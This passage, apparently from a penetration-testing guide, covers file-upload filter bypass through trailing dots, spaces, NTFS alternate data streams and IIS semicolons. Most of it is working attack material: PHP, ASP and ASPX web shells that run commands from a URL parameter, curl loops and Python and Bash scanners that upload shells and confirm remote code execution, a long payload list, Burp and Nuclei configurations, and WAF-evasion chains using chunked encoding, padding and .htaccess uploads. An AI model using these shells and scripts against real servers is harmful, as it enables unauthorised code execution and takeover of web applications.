  ```
  :::

  :::tabs-item{icon="i-lucide-server" label="Apache mod_mime + Trailing Dot"}
  ```bash
  # Apache mod_mime with trailing dot on Windows
  # The file is stored without trailing dot
  # mod_mime then processes the clean extension
  
  # Test with alternative PHP extensions + trailing dot
  for ext in php php3 php4 php5 php7 phtml pht phar; do
    for dots in "." ".." "..." ". " " ."; do
      filename="shell.${ext}${dots}"
      encoded=$(echo "$filename" | sed 's/ /%20/g')
      
      code=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST https://target.com/upload \
        -F "file=@/tmp/apache_shell.php;filename=${encoded}" \
        -H "Cookie: session=SESS")
      
      [ "$code" = "200" ] || [ "$code" = "201" ] && \
        echo "[UPLOADED] ${filename}"
    done
  done
  
  # Check all possible stored names
  for ext in php php3 php4 php5 php7 phtml pht phar; do
    result=$(curl -s "https://target.com/uploads/shell.${ext}?cmd=id")
    echo "$result" | grep -q "APACHE_WIN" && echo "[+] EXEC: shell.${ext}"
  done
  ```
  :::
::

### Technique 8 — Linux-Specific Trailing Dot Attacks

::note{icon="i-lucide-info"}
Linux preserves trailing dots in filenames. The bypass on Linux targets how the **web server** handles the dot, not the OS filesystem. Apache with certain configurations may still execute `shell.php.` as PHP.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Apache on Linux"}
  ```bash
  # Apache on Linux — mod_mime behavior with trailing dot
  # Depends on AddHandler / AddType configuration
  
  SHELL='<?php echo "LINUX_APACHE_DOT"; system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/linux_shell.php
  
  # Upload with trailing dot
  curl -X POST https://target.com/upload \
    -F "file=@/tmp/linux_shell.php;filename=shell.php." \
    -H "Cookie: session=SESS"
  
  # On Linux, file IS stored as "shell.php."
  # Apache mod_mime checks extensions right-to-left
  # "." is not a recognized extension
  # Falls back to ".php" → MAY EXECUTE
  
  curl "https://target.com/uploads/shell.php.?cmd=id"
  # Note: Access with the trailing dot since Linux preserves it
  
  # If AddHandler is configured with SetHandler:
  # <FilesMatch "\.php">
  #     SetHandler application/x-httpd-php
  # </FilesMatch>
  # This regex matches "shell.php." because \.php matches before the dot
  
  # Test both access patterns
  curl "https://target.com/uploads/shell.php.?cmd=id"
  curl "https://target.com/uploads/shell.php?cmd=id"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Nginx on Linux"}
  ```bash
  # Nginx on Linux — trailing dot usually prevents execution
  # BUT can chain with PATH_INFO
  
  # Upload polyglot with trailing dot
  echo 'GIF89a<?php echo "NGINX_DOT"; system($_GET["cmd"]); ?>' > /tmp/nginx_shell.php
  
  curl -X POST https://target.com/upload \
    -F "file=@/tmp/nginx_shell.php;filename=shell.gif." \
    -H "Cookie: session=SESS"
  
  # Standard access (won't execute)
  curl "https://target.com/uploads/shell.gif."
  
  # PATH_INFO bypass (if cgi.fix_pathinfo=1)
  curl "https://target.com/uploads/shell.gif./x.php?cmd=id"
  curl "https://target.com/uploads/shell.gif./.php?cmd=id"
  
  # If location block uses regex:
  # location ~ \.php$ { ... }
  # "shell.php." does NOT match \.php$ on Linux
  # "shell.php./x.php" → PATH_INFO processes it
  ```
  :::
::

## Complete Payload List

::code-collapse

```bash [trailing-dot-payloads.txt]
# ═══════════════════════════════════════════
# TRAILING DOT BYPASS - COMPLETE PAYLOAD SET
# ═══════════════════════════════════════════

# === SINGLE TRAILING DOT ===
shell.php.
shell.asp.
shell.aspx.
shell.jsp.
shell.jspx.
shell.phtml.
shell.pht.
shell.php5.
shell.phar.
shell.ashx.
shell.asmx.
shell.cer.
shell.asa.
shell.cfm.
shell.cgi.
shell.pl.
shell.py.
shell.rb.
shell.shtml.

# === MULTIPLE TRAILING DOTS ===
shell.php..
shell.php...
shell.php....
shell.php.....
shell.php..........
shell.asp..
shell.aspx..
shell.jsp..
shell.aspx...

# === TRAILING SPACE ===
shell.php%20
shell.php%20%20
shell.php%20%20%20
shell.asp%20
shell.aspx%20
shell.jsp%20

# === DOT + SPACE COMBINATIONS ===
shell.php.%20
shell.php%20.
shell.php.%20.
shell.php%20.%20
shell.php.%20.%20
shell.php%20.%20.
shell.php.%20.%20.

# === NTFS ALTERNATE DATA STREAMS ===
shell.php::$DATA
shell.php::$DATA.
shell.php::$DATA..
shell.php::$DATA%20
shell.php::$DATA.jpg
shell.php::$DATA.png
shell.php::$DATA.gif
shell.php::$DATA.txt
shell.php::$DATA.pdf
shell.asp::$DATA
shell.aspx::$DATA
shell.ashx::$DATA
shell.asp::$DATA.jpg
shell.aspx::$DATA.jpg

# === COLON VARIANTS (NTFS) ===
shell.php:
shell.php:.
shell.php:.jpg
shell.php:$DATA
shell.asp:
shell.asp:.jpg

# === URL-ENCODED DOT (%2e) ===
shell.php%2e
shell.php%2e%2e
shell.php%2e%2e%2e
shell%2ephp%2e
shell.php%2E
shell.php%2E%2E

# === DOUBLE URL-ENCODED ===
shell.php%252e
shell.php%252e%252e
shell.php%2520

# === TAB / CONTROL CHARACTERS ===
shell.php%09
shell.php%09.
shell.php.%09
shell.php%0a
shell.php%0d
shell.php%0d%0a
shell.php%0a.
shell.php.%0a
shell.php%0b

# === SEMICOLON (IIS) ===
shell.asp;.jpg.
shell.aspx;.jpg.
shell.asp;.png.
shell.asp;test.jpg.
shell.asp;.jpg%20
shell.asp;.jpg..
shell.aspx;.jpg.%20

# === COMBINED: DOUBLE EXT + TRAILING DOT ===
shell.php.jpg.
shell.php.png.
shell.php.gif.
shell.php.txt.
shell.php.pdf.
shell.php.xxx.
shell.php.jpg..
shell.php.png..
shell.asp.jpg.
shell.aspx.jpg.
shell.jsp.jpg.

# === COMBINED: TRAILING DOT + CASE ===
shell.Php.
shell.pHp.
shell.phP.
shell.PHP.
shell.pHP.
shell.PhP.
shell.Asp.
shell.ASP.
shell.Aspx.
shell.ASPX.

# === UNICODE DOT VARIANTS ===
shell.php%EF%BC%8E
shell.php%E3%80%82
shell.php%C0%AE

# === NULL BYTE + TRAILING DOT ===
shell.php%00.
shell.php.%00
shell.php%00.jpg.
shell.php%2500.
shell.php.%2500

# === WINDOWS 8.3 SHORT NAME + DOT ===
SHELL~1.PHP.
SHELL~1.ASP.
```
::

## Automated Exploitation

### Complete Scanner Script

::tabs
  :::tabs-item{icon="i-lucide-code" label="Python Scanner"}
  ```python
  #!/usr/bin/env python3
  """
  Trailing Dot Bypass Scanner
  Tests all trailing character bypass variants against file upload endpoints
  """
  
  import requests
  import sys
  import urllib.parse
  
  class TrailingDotScanner:
      def __init__(self, target, upload_path, access_path, cookie):
          self.target = target.rstrip('/')
          self.upload_url = f"{self.target}{upload_path}"
          self.access_base = f"{self.target}{access_path}"
          self.session = requests.Session()
          self.session.headers['Cookie'] = cookie
          self.session.verify = False
          self.results = []
          
          self.php_shell = '<?php echo "TDOT_" . php_uname(); system($_GET["cmd"]); ?>'
          self.asp_shell = '<% Response.Write("TDOT_" & CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll) %>'
          self.aspx_shell = '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% if(Request["cmd"]!=null){Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write("TDOT_"+p.StandardOutput.ReadToEnd());} %>'
      
      def generate_payloads(self, base_ext):
          """Generate all trailing character variants for an extension"""
          payloads = []
          
          # Trailing dots
          for count in range(1, 8):
              payloads.append(f"shell.{base_ext}" + "." * count)
          
          # Trailing spaces (URL-encoded)
          for count in range(1, 4):
              payloads.append(f"shell.{base_ext}" + " " * count)
          
          # Dot-space combinations
          combos = [
              ". ", " .", ". .", " . ", ". . ", " . .",
              ".  ", "  .", ".  .", ".. ", " ..", ".. ."
          ]
          for combo in combos:
              payloads.append(f"shell.{base_ext}{combo}")
          
          # NTFS ADS
          ads_variants = [
              "::$DATA", "::$DATA.", "::$DATA..",
              "::$DATA.jpg", "::$DATA.png", "::$DATA.gif",
              "::$DATA ", "::$DATA. ",
              ":", ":.", ":.jpg"
          ]
          for ads in ads_variants:
              payloads.append(f"shell.{base_ext}{ads}")
          
          # Control characters
          controls = [
              "\t", "\n", "\r", "\r\n",
              ".\t", ".\n", ".\r",
              "\t.", "\n.", "\r."
          ]
          for ctrl in controls:
              payloads.append(f"shell.{base_ext}{ctrl}")
          
          # Combined with double extension
          safe_exts = ['jpg', 'png', 'gif', 'txt', 'pdf']
          for safe in safe_exts:
              payloads.append(f"shell.{base_ext}.{safe}.")
              payloads.append(f"shell.{base_ext}.{safe}..")
              payloads.append(f"shell.{base_ext}.{safe} ")
              payloads.append(f"shell.{base_ext}.{safe}::$DATA")
          
          # Case + trailing dot
          case_variants = [
              base_ext.upper(),
              base_ext.capitalize(),
              base_ext[0].upper() + base_ext[1:],
              base_ext[:-1] + base_ext[-1].upper()
          ]
          for case_var in set(case_variants):
              payloads.append(f"shell.{case_var}.")
              payloads.append(f"shell.{case_var}..")
              payloads.append(f"shell.{case_var} ")
          
          return payloads
      
      def upload(self, filename, content, content_type='image/jpeg'):
          try:
              files = {'file': (filename, content, content_type)}
              r = self.session.post(self.upload_url, files=files, timeout=10)
              return r.status_code
          except:
              return 0
      
      def check_execution(self, base_name, base_ext, marker='TDOT_'):
          """Check multiple possible stored filenames"""
          candidates = [
              f"{base_name}.{base_ext}",          # Trailing chars stripped
              f"{base_name}.{base_ext}.",          # Dot preserved (Linux)
              f"{base_name}.{base_ext.upper()}",   # Case normalized
          ]
          
          for name in candidates:
              for path_prefix in ['', 'uploads/', 'media/', 'files/']:
                  url = f"{self.access_base}/{path_prefix}{name}"
                  try:
                      r = self.session.get(url, params={'cmd': 'echo CONFIRMED'}, timeout=5)
                      if marker in r.text or 'CONFIRMED' in r.text:
                          return url
                  except:
                      pass
          return None
      
      def scan_extension(self, ext, shell_content):
          """Scan all payloads for a specific extension"""
          payloads = self.generate_payloads(ext)
          print(f"\n[*] Testing {len(payloads)} payloads for .{ext}")
          
          for i, payload in enumerate(payloads):
              status = self.upload(payload, shell_content)
              
              if status in [200, 201]:
                  url = self.check_execution('shell', ext)
                  if url:
                      self.results.append({
                          'payload': payload,
                          'extension': ext,
                          'url': url,
                          'status': 'RCE'
                      })
                      print(f"  [+] RCE: '{payload}'")
                      print(f"      URL: {url}")
                      return True
                  else:
                      if i < 5:  # Only print first few uploads without exec
                          print(f"  [~] Uploaded but no exec: '{payload}'")
          
          return False
      
      def run(self):
          print(f"[*] Target: {self.upload_url}")
          print(f"[*] Access: {self.access_base}")
          print(f"[*] Starting trailing dot bypass scan...")
          
          # Test PHP
          self.scan_extension('php', self.php_shell)
          self.scan_extension('phtml', self.php_shell)
          self.scan_extension('pht', self.php_shell)
          self.scan_extension('php5', self.php_shell)
          self.scan_extension('phar', self.php_shell)
          
          # Test ASP
          self.scan_extension('asp', self.asp_shell)
          self.scan_extension('aspx', self.aspx_shell)
          self.scan_extension('ashx', self.aspx_shell)
          
          # Report
          print(f"\n{'='*60}")
          print(f"  RESULTS: {len(self.results)} bypass(es) found")
          print(f"{'='*60}")
          
          for r in self.results:
              print(f"\n  [{r['status']}] Extension: .{r['extension']}")
              print(f"  Payload:  {r['payload']}")
              print(f"  URL:      {r['url']}")
          
          return len(self.results) > 0
  
  if __name__ == '__main__':
      scanner = TrailingDotScanner(
          target=sys.argv[1],       # https://target.com
          upload_path=sys.argv[2],  # /upload
          access_path=sys.argv[3],  # /uploads
          cookie=sys.argv[4]        # session=abc
      )
      scanner.run()
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Bash Scanner"}
  ```bash
  #!/bin/bash
  # trailing_dot_scanner.sh
  
  TARGET="${1:?Usage: $0 <target> <upload_ep> <access_path> <cookie>}"
  UPLOAD_EP="${2}"
  ACCESS_PATH="${3}"
  COOKIE="${4}"
  
  SHELL='<?php echo "TDOT_BYPASS_".php_uname(); system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/tdot_shell.php
  
  SUCCESS=0
  
  test_payload() {
    local payload="$1"
    local clean_name="$2"
    local encoded=$(echo "$payload" | sed 's/ /%20/g; s/\t/%09/g')
    
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST "${TARGET}${UPLOAD_EP}" \
      -F "file=@/tmp/tdot_shell.php;filename=${encoded}" \
      -H "Cookie: ${COOKIE}" 2>/dev/null)
    
    if [ "$code" = "200" ] || [ "$code" = "201" ]; then
      # Check execution under clean name
      result=$(curl -s "${TARGET}${ACCESS_PATH}/${clean_name}?cmd=echo+CONFIRMED" 2>/dev/null)
      if echo "$result" | grep -q "TDOT_BYPASS\|CONFIRMED"; then
        echo "[+] RCE: '${payload}' → ${clean_name}"
        SUCCESS=1
        return 0
      fi
      
      # Check with dot preserved
      result2=$(curl -s "${TARGET}${ACCESS_PATH}/${payload}?cmd=echo+CONFIRMED" 2>/dev/null)
      if echo "$result2" | grep -q "TDOT_BYPASS\|CONFIRMED"; then
        echo "[+] RCE (dot preserved): '${payload}'"
        SUCCESS=1
        return 0
      fi
      
      echo "[~] Uploaded: '${payload}' (no exec)"
    fi
    return 1
  }
  
  echo "[*] === Trailing Dot Payloads ==="
  for dots in "." ".." "..." "...." "....." ".........." ; do
    test_payload "shell.php${dots}" "shell.php"
    [ $SUCCESS -eq 1 ] && break
  done
  
  echo "[*] === Trailing Space Payloads ==="
  for spaces in "%20" "%20%20" "%20%20%20"; do
    test_payload "shell.php${spaces}" "shell.php"
    [ $SUCCESS -eq 1 ] && break
  done
  
  echo "[*] === Dot+Space Combinations ==="
  for combo in ".%20" "%20." ".%20." "%20.%20" ".%20.%20"; do
    test_payload "shell.php${combo}" "shell.php"
    [ $SUCCESS -eq 1 ] && break
  done
  
  echo "[*] === NTFS ADS Payloads ==="
  for ads in "::\$DATA" "::\$DATA." "::\$DATA.jpg" ":" ":."; do
    test_payload "shell.php${ads}" "shell.php"
    [ $SUCCESS -eq 1 ] && break
  done
  
  echo "[*] === Alternative Extensions + Dot ==="
  for ext in phtml pht php5 php7 phar asp aspx; do
    test_payload "shell.${ext}." "shell.${ext}"
    [ $SUCCESS -eq 1 ] && break
  done
  
  echo "[*] === Double Extension + Dot ==="
  for safe in jpg png gif txt pdf; do
    test_payload "shell.php.${safe}." "shell.php.${safe}"
    test_payload "shell.php.${safe}.." "shell.php.${safe}"
    [ $SUCCESS -eq 1 ] && break
  done
  
  echo ""
  if [ $SUCCESS -eq 1 ]; then
    echo "[+] Trailing dot bypass SUCCESSFUL"
  else
    echo "[-] No trailing dot bypass found"
  fi
  
  rm -f /tmp/tdot_shell.php
  ```
  :::
::

### Burp Suite Integration

::tabs
  :::tabs-item{icon="i-lucide-zap" label="Intruder Configuration"}
  ```yaml
  # Burp Intruder - Trailing Dot Bypass
  #
  # 1. Capture upload request
  # 2. Send to Intruder
  # 3. Set payload position on filename:
  #    filename="shell.php§SUFFIX§"
  #
  # Payload Type: Simple list
  # Load: trailing-dot-payloads-suffixes.txt
  #
  # Suffix payloads:
  .
  ..
  ...
  ....
  .....
  %20
  %20%20
  .%20
  %20.
  .%20.
  %20.%20
  ::$DATA
  ::$DATA.
  ::$DATA.jpg
  :
  :.
  :.jpg
  %09
  %0a
  %0d
  %0d%0a
  .%09
  .%0a
  %00
  %00.
  .%00
  #
  # Grep Match: "uploaded", "success", "saved"
  # Grep Extract: File path patterns
  # 
  # After finding uploads, verify execution separately
  ```
  :::

  :::tabs-item{icon="i-lucide-zap" label="Match/Replace Rules"}
  ```yaml
  # Burp Match/Replace for automatic trailing dot injection
  #
  # Type: Request header
  # Match: filename="([^"]+)\.php"
  # Replace: filename="$1.php."
  # Enabled: Toggle during testing
  #
  # Additional rules:
  #
  # Rule 2: Double dot
  # Match: filename="([^"]+)\.php"  
  # Replace: filename="$1.php.."
  #
  # Rule 3: NTFS ADS
  # Match: filename="([^"]+)\.php"
  # Replace: filename="$1.php::$DATA"
  #
  # Rule 4: Space
  # Match: filename="([^"]+)\.php"
  # Replace: filename="$1.php "
  #
  # Rule 5: Dot-space
  # Match: filename="([^"]+)\.php"
  # Replace: filename="$1.php. "
  ```
  :::
::

### Nuclei Templates

::code-group
```yaml [Trailing Dot Detection]
id: upload-trailing-dot-bypass

info:
  name: File Upload Trailing Dot Bypass
  author: pentester
  severity: critical
  tags: upload,bypass,trailing-dot,rce

http:
  - raw:
      - |
        POST {{BaseURL}}/upload HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{cookie}}
        Content-Type: multipart/form-data; boundary=----TrailDot

        ------TrailDot
        Content-Disposition: form-data; name="file"; filename="tdot_test.php{{suffix}}"
        Content-Type: image/jpeg

        <?php echo "TRAILING_DOT_BYPASS_NUCLEI"; ?>
        ------TrailDot--

      - |
        GET {{BaseURL}}/uploads/tdot_test.php HTTP/1.1
        Host: {{Hostname}}

    payloads:
      suffix:
        - "."
        - ".."
        - "..."
        - " "
        - ". "
        - " ."
        - "::$DATA"
        - "::$DATA."

    attack: pitchfork

    matchers:
      - type: word
        words:
          - "TRAILING_DOT_BYPASS_NUCLEI"
        part: body
```

```yaml [NTFS ADS Detection]
id: upload-ntfs-ads-bypass

info:
  name: File Upload NTFS ADS Bypass
  author: pentester
  severity: critical
  tags: upload,bypass,ntfs,ads,rce

http:
  - raw:
      - |
        POST {{BaseURL}}/upload HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{cookie}}
        Content-Type: multipart/form-data; boundary=----ADSTest

        ------ADSTest
        Content-Disposition: form-data; name="file"; filename="ads_test.php::$DATA{{ext}}"
        Content-Type: image/jpeg

        <?php echo "ADS_BYPASS_NUCLEI_" . php_uname(); ?>
        ------ADSTest--

      - |
        GET {{BaseURL}}/uploads/ads_test.php HTTP/1.1
        Host: {{Hostname}}

    payloads:
      ext:
        - ""
        - "."
        - ".jpg"
        - ".png"

    attack: pitchfork

    matchers:
      - type: word
        words:
          - "ADS_BYPASS_NUCLEI"
        part: body
```
::

## Chaining Techniques

### Chain 1 — Trailing Dot + Case Manipulation

::steps{level="4"}

#### Test Case + Dot Combination

```bash
# Combine case bypass with trailing dot
SHELL='<?php echo "CASE_DOT_CHAIN"; system($_GET["cmd"]); ?>'
echo "$SHELL" > /tmp/chain1.php

PAYLOADS=(
  "shell.Php."    "shell.pHp."    "shell.phP."
  "shell.PHP."    "shell.pHP."    "shell.PhP."
  "shell.Php.."   "shell.pHp.."   "shell.PHP.."
  "shell.Php "    "shell.pHp "    "shell.PHP "
  "shell.Phtml."  "shell.pHtml."  "shell.PHTML."
  "shell.Php::$DATA"  "shell.PHP::$DATA"
)

for payload in "${PAYLOADS[@]}"; do
  encoded=$(echo "$payload" | sed 's/ /%20/g')
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/upload \
    -F "file=@/tmp/chain1.php;filename=${encoded}" \
    -H "Cookie: session=SESS")
  
  [ "$code" = "200" ] || [ "$code" = "201" ] && echo "[UPLOADED] ${payload}"
done

# Check execution (Windows normalizes case)
curl "https://target.com/uploads/shell.php?cmd=id"
```

#### Verify Execution

```bash
result=$(curl -s "https://target.com/uploads/shell.php?cmd=id")
echo "$result" | grep -q "CASE_DOT_CHAIN" && echo "[+] Chain successful!"
```

::

### Chain 2 — Trailing Dot + Content-Type Spoofing

::steps{level="4"}

#### Upload with Spoofed MIME and Trailing Dot

```bash
# Triple bypass: trailing dot + MIME spoof + magic bytes
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00' > /tmp/chain2.php
echo '<?php echo "TRIPLE_CHAIN"; system($_GET["cmd"]); ?>' >> /tmp/chain2.php

# Trailing dot bypasses extension check
# image/jpeg bypasses MIME check  
# JPEG header bypasses magic byte check
curl -X POST https://target.com/upload \
  -F "file=@/tmp/chain2.php;filename=avatar.php.;type=image/jpeg" \
  -H "Cookie: session=SESS"
```

#### Verify Three-Layer Bypass

```bash
curl "https://target.com/uploads/avatar.php?cmd=id"
curl "https://target.com/uploads/avatar.php?cmd=whoami"
```

::

### Chain 3 — Trailing Dot + .htaccess Upload

::steps{level="4"}

#### Upload .htaccess with Trailing Dot (Bypass Filename Block)

```bash
# If ".htaccess" is blocked but ".htaccess." is not
cat > /tmp/htaccess_payload << 'EOF'
AddType application/x-httpd-php .jpg .png .gif
AddHandler php-script .jpg .png .gif
EOF

# Upload .htaccess with trailing dot
curl -X POST https://target.com/upload \
  -F "file=@/tmp/htaccess_payload;filename=.htaccess." \
  -H "Cookie: session=SESS"

# On Windows: .htaccess. → .htaccess (dot stripped)
# Apache reads .htaccess and enables PHP in images
```

#### Upload PHP Shell as Image

```bash
echo '<?php echo "HTACCESS_DOT_CHAIN"; system($_GET["cmd"]); ?>' > /tmp/shell_img.jpg

curl -X POST https://target.com/upload \
  -F "file=@/tmp/shell_img.jpg;filename=avatar.jpg;type=image/jpeg" \
  -H "Cookie: session=SESS"

# Execute through .htaccess-enabled PHP handling
curl "https://target.com/uploads/avatar.jpg?cmd=id"
```

::

### Chain 4 — Trailing Dot + IIS Semicolon

::steps{level="4"}

#### Combine IIS Semicolon with Trailing Dot

```bash
# Double bypass for IIS
# Semicolon bypasses extension check
# Trailing dot is stripped by Windows
ASP_SHELL='<% Response.Write("IIS_DOUBLE_CHAIN " & CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll) %>'
echo "$ASP_SHELL" > /tmp/iis_chain.asp

PAYLOADS=(
  "shell.asp;.jpg."       # Semicolon + safe ext + trailing dot
  "shell.asp;.jpg.."      # Double trailing dots
  "shell.asp;.jpg "       # Semicolon + safe ext + trailing space
  "shell.asp;.jpg::$DATA" # Semicolon + safe ext + ADS
  "shell.asp;test.png."   # Semicolon + different safe ext + dot
  "shell.aspx;.jpg."      # ASPX variant
)

for payload in "${PAYLOADS[@]}"; do
  encoded=$(echo "$payload" | sed 's/ /%20/g')
  curl -s -o /dev/null -w "%-35s -> HTTP %{http_code}\n" "'${payload}'" \
    -X POST https://target.com/upload \
    -F "file=@/tmp/iis_chain.asp;filename=${encoded}" \
    -H "Cookie: session=SESS"
done

# IIS processes: shell.asp;.jpg. → shell.asp (semicolon + dot stripped)
curl "https://target.com/uploads/shell.asp?cmd=whoami"
```

::

### Chain 5 — Trailing Dot + WAF Bypass

::steps{level="4"}

#### Evade WAF Extension Detection

```bash
# WAF rules often match: \.php$ or \.asp$
# Trailing dot changes the pattern: shell.php. doesn't match \.php$

# Test WAF behavior
# Standard upload (WAF blocks)
curl -v -X POST https://target.com/upload \
  -F "file=@shell.php;filename=shell.php" \
  -H "Cookie: session=SESS" 2>&1 | grep "HTTP/"

# Trailing dot (WAF may not detect)
curl -v -X POST https://target.com/upload \
  -F "file=@shell.php;filename=shell.php." \
  -H "Cookie: session=SESS" 2>&1 | grep "HTTP/"
```

#### Chunked Transfer + Trailing Dot

```http
POST /upload HTTP/1.1
Host: target.com
Cookie: session=YOUR_SESSION
Content-Type: multipart/form-data; boundary=----WAFBypass
Transfer-Encoding: chunked

5
------
45
WAFBypass
Content-Disposition: form-data; name="file"; filename="shell.php."
2b

Content-Type: image/jpeg


25
<?php system($_GET["cmd"]); ?>

12
------WAFBypass--
0

```

#### Multipart Padding + Trailing Dot

```bash
# Large padding before the malicious filename to exceed WAF inspection buffer
python3 << 'PYEOF'
import requests

target = "https://target.com/upload"
cookie = "session=YOUR_SESSION"

boundary = "----PaddedBound"
padding = "A" * 8192  # 8KB padding to push filename past WAF buffer

body = f"------PaddedBound\r\n"
body += f'Content-Disposition: form-data; name="padding"\r\n\r\n'
body += f'{padding}\r\n'
body += f"------PaddedBound\r\n"
body += f'Content-Disposition: form-data; name="file"; filename="shell.php."\r\n'
body += f'Content-Type: image/jpeg\r\n\r\n'
body += f'<?php echo "WAF_DOT_BYPASS"; system($_GET["cmd"]); ?>\r\n'
body += f"------PaddedBound--\r\n"

headers = {
    "Cookie": cookie,
    "Content-Type": f"multipart/form-data; boundary=----PaddedBound"
}

r = requests.post(target, data=body, headers=headers, verify=False)
print(f"Upload: HTTP {r.status_code}")

# Check
r2 = requests.get("https://target.com/uploads/shell.php", params={"cmd": "id"}, verify=False)
if "WAF_DOT_BYPASS" in r2.text:
    print(f"[+] WAF bypassed with trailing dot + padding!")
PYEOF
```

::

## Verification & Evidence

::code-group
```bash [Non-Destructive PoC]
# Minimal proof of concept for reports
echo "TRAILING_DOT_POC_$(date +%s)" > /tmp/poc.txt

{
  echo "=== Trailing Dot Bypass PoC ==="
  echo "Target: ${TARGET}"
  echo "Date: $(date)"
  echo ""
  
  echo "=== Step 1: Upload with trailing dot ==="
  curl -v -X POST https://target.com/upload \
    -F "file=@/tmp/poc.txt;filename=poc_test.txt." \
    -H "Cookie: session=SESS" 2>&1
  
  echo ""
  echo "=== Step 2: Access without trailing dot ==="
  echo "Request: GET /uploads/poc_test.txt"
  curl -v "https://target.com/uploads/poc_test.txt" 2>&1
  
  echo ""
  echo "=== Step 3: Confirm OS stripped the dot ==="
  echo "File 'poc_test.txt.' was uploaded"
  echo "File 'poc_test.txt' is accessible (dot was stripped)"
  echo "This confirms Windows NTFS filename normalization"
  echo ""
  echo "=== Impact ==="
  echo "An attacker can upload 'shell.php.' which bypasses"
  echo "extension validation but is stored as 'shell.php'"
  echo "enabling remote code execution."
  
} | tee trailing_dot_poc.txt
```

```bash [RCE Proof]
# Demonstrate actual bypass with PHP execution
SHELL='<?php echo "TRAILING_DOT_RCE_CONFIRMED_" . date("Y-m-d_H:i:s"); ?>'
echo "$SHELL" > /tmp/rce_poc.php

echo "=== Upload shell.php. ==="
curl -v -X POST https://target.com/upload \
  -F "file=@/tmp/rce_poc.php;filename=rce_poc.php." \
  -H "Cookie: session=SESS" 2>&1 | tee /tmp/upload_evidence.txt

echo ""
echo "=== Access shell.php (dot stripped by OS) ==="
curl -v "https://target.com/uploads/rce_poc.php" 2>&1 | tee /tmp/access_evidence.txt

echo ""
echo "=== Verify PHP execution ==="
grep "TRAILING_DOT_RCE_CONFIRMED" /tmp/access_evidence.txt && \
  echo "[+] PHP code executed — RCE confirmed via trailing dot bypass"
```

```bash [Cleanup]
# Remove uploaded test files
curl -X DELETE "https://target.com/api/files/poc_test.txt" \
  -H "Cookie: session=SESS" 2>/dev/null

curl -X DELETE "https://target.com/api/files/rce_poc.php" \
  -H "Cookie: session=SESS" 2>/dev/null

# Or via direct removal if shell access is available
curl "https://target.com/uploads/rce_poc.php?cmd=del+C:\\inetpub\\wwwroot\\uploads\\rce_poc.php"
```
::

## Platform-Specific Reference

::collapsible{icon="i-lucide-table"}
**Trailing Character Behavior Matrix**

| Character | Windows NTFS | Linux ext4 | macOS APFS | macOS HFS+ | IIS | Apache (Win) | Apache (Linux) | Nginx |
|-----------|-------------|------------|------------|-------------|-----|-------------|----------------|-------|
| Trailing `.` | **Stripped** | Preserved | Preserved | **Stripped** | **Stripped** | **Stripped** | Preserved | Preserved |
| Trailing `..` | **Stripped** | Preserved | Preserved | **Stripped** | **Stripped** | **Stripped** | Preserved | Preserved |
| Trailing ` ` | **Stripped** | Preserved | Preserved | Preserved | **Stripped** | **Stripped** | Preserved | Preserved |
| `::$DATA` | **Stripped** | N/A | N/A | N/A | **Stripped** | N/A | N/A | N/A |
| Trailing `\t` | **Stripped** | Preserved | Preserved | Preserved | **Stripped** | **Stripped** | Preserved | Preserved |
| Trailing `\n` | Error | Preserved | Preserved | Preserved | Error | Error | Preserved | Preserved |
| `;` (IIS) | Preserved | Preserved | Preserved | Preserved | **Param sep** | Preserved | Preserved | Preserved |
::

## Quick Reference

::field-group
  ::field{name="Primary Payload" type="string"}
  `shell.php.` — Single trailing dot, stripped by Windows NTFS, bypasses extension validation
  ::

  ::field{name="Multi-Dot Payload" type="string"}
  `shell.php...` — Multiple trailing dots all stripped on Windows, may bypass single-dot filters
  ::

  ::field{name="Space Payload" type="string"}
  `shell.php ` (with trailing space) — Windows strips trailing spaces from filenames
  ::

  ::field{name="NTFS ADS Payload" type="string"}
  `shell.php::$DATA` — Alternate Data Stream reference stripped by Windows, extension becomes `::$DATA`
  ::

  ::field{name="ADS + Extension" type="string"}
  `shell.php::$DATA.jpg` — Validator sees `.jpg` extension, NTFS strips ADS notation, file stored as `shell.php`
  ::

  ::field{name="Dot-Space Combo" type="string"}
  `shell.php. ` — Both trailing dot and space stripped by Windows, bypasses dot-only and space-only filters
  ::

  ::field{name="OS Requirement" type="string"}
  Windows (NTFS/FAT32) for automatic stripping. On Linux, requires web server misconfiguration (Apache mod_mime)
  ::

  ::field{name="Validation Gap" type="string"}
  Application validates in memory (preserving dots) → OS stores on disk (stripping dots) → TOCTOU vulnerability
  ::

  ::field{name="Detection" type="string"}
  Upload `test.txt.` then check if `test.txt` is accessible — if yes, trailing dot stripping confirmed
  ::
::

::badge
File Upload — Trailing Dot — NTFS Normalization — Extension Bypass — RCE
::